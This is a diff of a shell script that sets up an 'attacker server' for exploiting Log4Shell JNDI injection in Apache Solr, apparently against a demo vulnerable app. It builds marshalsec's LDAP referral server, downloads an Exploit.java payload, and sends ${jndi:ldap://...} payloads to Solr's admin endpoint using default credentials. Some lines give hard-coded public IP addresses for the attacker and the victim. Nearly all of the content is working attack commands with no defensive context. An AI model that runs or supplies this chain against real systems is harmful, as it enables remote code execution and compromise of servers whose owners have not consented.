@@ -1,13 +1,23 @@
 ##Attacker server setup - Debian 9
+    # install dependencies
 sudo apt update
-sudo apt install netcat openjdk-8-jdk dnsutils zip curl unzip nmap net-tools python maven -y
-# create a listener to test the vulnerability
-# curl -u solr:SolrRocks 'http://$VICTIMIP:8983/solr/admin/cores?foo=$\{jndi:ldap://$MYIP:9999\}'
+sudo apt install netcat dnsutils zip curl unzip nmap net-tools python maven git -y
+    # install Java
+mkdir /usr/java
+cd /usr/java
+wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+tar xzvf jdk-8u181-linux-x64.tar.gz
+update-alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_181/bin/java 100
+update-alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_181/bin/javac 100
+cd ~/
+    # create a listener to test the vulnerability
+    # curl -u solr:SolrRocks 'http://$VICTIMIP:8983/solr/admin/cores?foo=$\{jndi:ldap://$MYIP:9999\}'
+    # download marshalsec tool and build it
 git clone https://github.com/mbechler/marshalsec
 cd marshalsec
 mvn clean package -DskipTests
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$MYIP:8000/#Exploit" &
-# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://142.93.169.210:8000/#Exploit" &
+# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$MYIP:8000/#Exploit" &
+# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://164.92.207.132:8000/#Exploit"
 mkdir exploit && cd exploit
 wget https://raw.githubusercontent.com/MartinPavelka/DO-vulnApp-DO/main/Exploit.java
 vim Exploit.java
@@ -19,40 +29,13 @@ curl -u solr:SolrRocks 'http://victimIP:8983/solr/admin/cores?foo=$\{jndi:ldap:/
 # curl -u solr:SolrRocks 'http://164.90.231.255:8983/solr/admin/cores?foo=$\{jndi:ldap://142.93.169.210:1389/Exploit\}'
 
 
-###### MANUAL PART
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-
-python -m SimpleHTTPServer 8000 &
 
 
-
-
-
-
-/***
-*
-*
-*
-*
-*
-*
+: '
 unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 echo "export myIP=`dig +short txt ch whoami.cloudflare @1.0.0.1 | awk -F '\"' '{print $2}'`" >> ~/.bashrc
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $myIP -p 8888 &
-*/
+'
 
 
